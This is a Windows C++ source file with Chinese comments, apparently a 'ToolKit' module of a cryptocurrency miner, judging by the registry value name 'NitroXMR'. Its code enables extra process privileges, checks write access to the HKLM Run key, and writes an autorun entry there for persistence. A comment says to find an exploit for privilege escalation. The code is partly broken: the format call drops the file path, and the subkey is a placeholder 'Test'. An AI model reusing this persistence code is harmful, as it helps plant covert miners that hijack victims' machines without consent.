#include "stdafx.h"
#include "ToolKit.h"

// executePath

//提权的问题找找exp吧

BOOL CToolKit::IsKeyEdit()
{
	CRegKey reg;        //定义注册表对象

	
	if (TRUE == SetPrivilege(SE_CREATE_GLOBAL_NAME, TRUE))
	{
		printf("[+] Creat Privilege OK \n");
	}

	if (TRUE == SetPrivilege(SE_BACKUP_NAME, TRUE))
	{
		printf("[+] Backup Privilege OK \n");
	}
	
	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
	{

		printf("[+] Open Reg OK \n");
		bKeyEdit = TRUE;
		reg.Close();
	}
	else
	{
		bKeyEdit = FALSE;
		printf("[-] Open Reg Failed\n");
	}

	
	return bKeyEdit;
}



BOOL CToolKit::setAutoRun(PCWSTR szFileFullPath)
{
	CString exePath;
	CRegKey reg;        //定义注册表对象

						//HKEY hK;
						//RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
						//	0, KEY_WRITE | KEY_READ, &hK);
						//printf("%d\n", hK);
						//RegCloseKey(hK);

						//这里竟然自动到了Software\\WOW6432node\\Microsoft\\Windows\\CurrentVersion\\Run
						//折腾了半天就是说怎么打得开写的入就是没有!!!!!!F**K
						//都上atl了,不过也挺好用

	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
	{
		printf("[+] Open Reg OK \n");

		HKEY hKey = reg.m_hKey;
		if (ERROR_SUCCESS == reg.Create(hKey, L"Test", REG_NONE))
		{
			printf("%d\n", reg.m_hKey);

			//应该传入随机名称这里先代替掉
			//GetModuleFileName(NULL, executePath, MAX_PATH);
			
			TCHAR keyValue[64];

			wsprintf(keyValue, L"rundll32.exe", szFileFullPath);

			reg.SetStringValue(L"NitroXMR", keyValue);

			printf("[+] Write Reg OK\n");

		}
		else
		{
			printf("[-] Write Reg Failed\n");
		}
		reg.Close();
		return TRUE;
	}
	else
	{
		printf("[-] Open Reg Failed\n");
	}
	return FALSE;
}

BOOL CToolKit::SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) == 0)
	{
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	return TRUE;
}
